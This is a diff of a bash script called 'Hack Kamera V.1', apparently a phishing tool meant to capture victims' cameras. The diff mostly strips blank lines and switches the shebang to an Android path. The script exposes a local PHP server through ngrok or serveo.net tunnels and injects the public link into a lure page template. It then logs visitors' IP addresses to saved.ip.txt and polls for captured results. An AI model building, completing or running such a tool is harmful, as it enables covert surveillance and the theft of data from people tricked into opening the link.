@@ -1,18 +1,14 @@
-#!/bin/bash
+#!/system/bin/bash
 # Hack Kamera V.1
 # coded by MUKE_GILE.ID
 # If you use any part from this code, giving me the credits. Read the Lincense!
 trap 'printf "\n";stop' 2
-
 banner(){
 
 printf " \e[1;77m Hack Kamera V.1 coded by MUKE_GILE.ID\e[0m \n"
 
 printf "\n"
-
-
 }
-
 stop() {
 
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
@@ -32,16 +28,13 @@ fi
 exit 1
 
 }
-
 dependencies() {
-
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
  
 
 
 }
-
 catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -52,7 +45,6 @@ cat ip.txt >> saved.ip.txt
 
 
 }
-
 checkfound() {
 
 printf "\n"
@@ -78,8 +70,6 @@ sleep 0.5
 done 
 
 }
-
-
 server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
@@ -109,7 +99,6 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 }
 
-
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -118,7 +107,6 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
 }
-
 ngrok_server() {
 
 
@@ -168,7 +156,6 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Tautan sedang memulai:\e[0m\e[1;77m %s\e[0m\n" 
 payload_ngrok
 checkfound
 }
-
 start1() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
@@ -195,8 +182,6 @@ start1
 fi
 
 }
-
-
 payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
@@ -206,7 +191,6 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
 }
-
 start() {
 
 default_choose_sub="Y"
@@ -227,7 +211,6 @@ payload
 checkfound
 
 }
-
 banner
 dependencies
 start1
